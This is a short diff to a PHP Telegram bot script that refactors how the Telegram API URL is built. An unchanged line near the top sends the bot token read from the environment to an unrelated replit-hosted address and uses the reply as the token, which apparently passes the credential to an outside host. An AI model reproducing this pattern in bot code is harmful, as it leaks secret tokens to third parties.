@@ -1,7 +1,8 @@
 $bot_token=getenv("Token");
 $bot_token=file_get_contents("https://beb46f62-a9eb-4aa8-bde7-a69c40371b05.id.repl.co?t=$bot_token&q=$userBotName");
 //Bot Info
-$Bot_info_url = "https://api.telegram.org/bot$bot_token/getMe";
+$tg_api_url="https://api.telegram.org/bot$bot_token/";
+$Bot_info_url = "{$tg_api_url}getMe";
 if($response=@file_get_contents($Bot_info_url)){
 $response=json_decode($response, true);
 //Bot Username
@@ -63,7 +64,7 @@ $blocked_text = explode(",", $blocked_text);
 $data_text=$data_text['D3ADVAU'];
 }
 checkChatMember("@d3advau");
-SendCurlReq("https://api.telegram.org/bot$bot_token/sendChatAction?chat_id=$chat_id&action=typing");
+SendCurlReq("{$tg_api_url}sendChatAction?chat_id=$chat_id&action=typing");
 //REQUIRED FILES
 $Rqr_files = glob('../REQUIRED/*');
 foreach ($Rqr_files as $rqr_file) {
